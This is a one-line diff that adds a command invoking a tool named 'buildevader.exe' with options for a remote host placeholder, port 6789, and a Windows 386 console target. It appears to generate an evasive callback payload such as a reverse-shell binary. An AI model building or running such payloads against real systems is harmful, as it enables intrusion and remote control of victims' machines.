@@ -1,0 +1,1 @@
+buildevader.exe --rhost "RHOST" --rport 6789 --bintype "console" --targetos "windows" --targetarch "386" --saveas "urchoice"
